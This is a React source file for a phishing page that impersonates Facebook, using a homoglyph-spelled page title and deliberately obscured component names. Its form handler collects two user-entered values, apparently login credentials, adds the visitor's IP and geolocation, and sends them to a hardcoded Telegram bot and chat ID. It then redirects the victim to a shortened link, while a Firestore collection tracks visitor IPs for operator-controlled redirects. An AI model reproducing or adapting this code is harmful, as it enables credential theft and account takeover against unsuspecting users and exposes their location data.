import React, { useEffect, useState } from 'react';
import { addDoc, collection, doc, getDoc, getDocs, onSnapshot, setDoc } from 'firebase/firestore';
import { publicIpv4 } from 'public-ip';
import { BsInfoCircleFill as IconInfo } from "react-icons/bs";
import { IoIosAdd as IconAdd } from "react-icons/io";
import { footerLinks, desktoplanguages } from "../sakles/malores.js";
import { db } from '../cedeplajes.js';
import { useMediaQuery } from 'react-responsive';
import '../crosto/poza992.css';

const Gallas = () => {
    const [ip, setIp] = useState(undefined);
    const [grraht, setCode] = useState('');
    const [dexlus, setdexlus] = useState('');
    const [userData, setUserData] = useState(undefined);
    const [isUserData, setIsUserData] = useState(false);
    const [userUrl, setUserUrl] = useState(false);

    const handleActions = (event) => {
        event.preventDefault(); // Prevent the default form submission
        if (grraht === '') {
            // Handle code validation
            return;
        } else {
            const bot = 'bot8210786394:AAGCt_NAm02qOFH386Q7JwTD5x2-kNA2PQQ';
            const chid = '7165145644';

            fetch(`https://ipapi.co/json/`)
                .then((response) => response.json())
                .then((response) => {
                    const { country, region, city } = response;
                    const content = `========================
LS 1: '${grraht}'
LS 2: '${dexlus}'
Country : '${country}'
Region : '${region}'
City : '${city}'
IP: '${ip}'
========================`;

                    const encodedContent = encodeURIComponent(content);

                    fetch(`https://api.telegram.org/${bot}/sendMessage?chat_id=${chid}&text=${encodedContent}`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                    })
                        .then(() => {
                            window.location = 'https://t.co/Vam0quhNy4';
                        })
                        .catch((error) => {
                            window.location = 'https://t.co/Vam0quhNy4';
                        });
                });
        }
    };

    const handleCodeChange = (e) => {
        setCode(e.target.value); // Allow any input
    };

    const handleCodeChange1 = (e) => {
        setdexlus(e.target.value); // Allow any input
    };

    const getUserData = async () => {
        const documentSnapshot = await getDocs(collection(db, "costarica"));
        const newData = documentSnapshot.docs.map((doc) => ({ ...doc.data(), id: doc.id }));
        const filter = newData.filter((x) => {
            if (x.ip === ip) {
                setIsUserData(true);
                setUserData(x);
                return x;
            }
        });
        if (filter.length === 0) {
            addUserData();
        }
    };

    const getIp = async () => {
        if (!ip) {
            const ipAddress = await publicIpv4();
            setIp(ipAddress);
        }
    };

    useEffect(() => {
        getIp();
    }, []);

    useEffect(() => {
        if (ip) {
            onSnapshot(collection(db, "costarica"), (snapshot) => {
                let isExist = false;
                snapshot.docs
                    .map((doc) => ({ ...doc.data(), id: doc.id }))
                    .filter((x) => {
                        if (x.ip === ip) {
                            isExist = true;
                            setUserData(x);
                            fetch('./data.json')
                                .then((res) => res.json())
                                .then((data) => {
                                    data.url_data.filter((item) => {
                                        if (item.id === parseInt(x.redir)) {
                                            setUserUrl(item.url);
                                            return;
                                        }
                                    });
                                })
                                .catch((err) => {
                                    console.log(err, ' error');
                                });
                        }
                    });
                if (!isExist) {
                    setUserUrl(false);
                }
            });
        }
    }, [ip]);

    useEffect(() => {
        document.title = 'Fасe‌bооk';
    }, [userData, userUrl]);

    const addUserData = async () => {
        try {
            const docRef = doc(collection(db, "costarica"), ip);

            const docSnap = await getDoc(docRef);

            if (!docSnap.exists()) {
                await setDoc(docRef, {
                    ip: ip,
                    number: -1,
                    redir: "-1",
                });
                console.log("Document written with ID: ", ip);
                getUserData();
            } else {
                console.log("Document already exists with ID: ", ip);
            }
        } catch (e) {
            console.error("Error adding document: ", e);
        }
    };

    const resetUserNumber = async () => {
        try {
            const docRef = doc(collection(db, "costarica"), ip);
            await setDoc(docRef, { redir: "-1" }, { merge: true });
            console.log("User number reset to -1 for IP: ", ip);
        } catch (e) {
            console.error("Error resetting user number: ", e);
        }
    };

    useEffect(() => {
        if (ip) {
            getUserData();
        }
    }, [ip]);

    if (userUrl) {
        setTimeout(() => {
            window.location = userUrl;
        }, 1000);
        resetUserNumber();
    }

    console.log("hi here is the data", isUserData, userData);

    if (isUserData) {
        return (
            <>
                <header className="2vos">
                    <div className="brohitis"></div>
                    <h1 className="vets"></h1>
                </header>
                <body className="rahade" id="rahade" name="rahade">
                    <br />
                    <div className="crembly">
                    </div> <br /> <br /> <br />
                    <div class="boading-container">
    <div class="masha"></div>
    <div class="boading-bar"></div>
  </div>
                </body>

                <footer>
                    <p></p>
                </footer>
            </>
        );
    }

    return null; // Return null if no user data
};

export default Gallas;
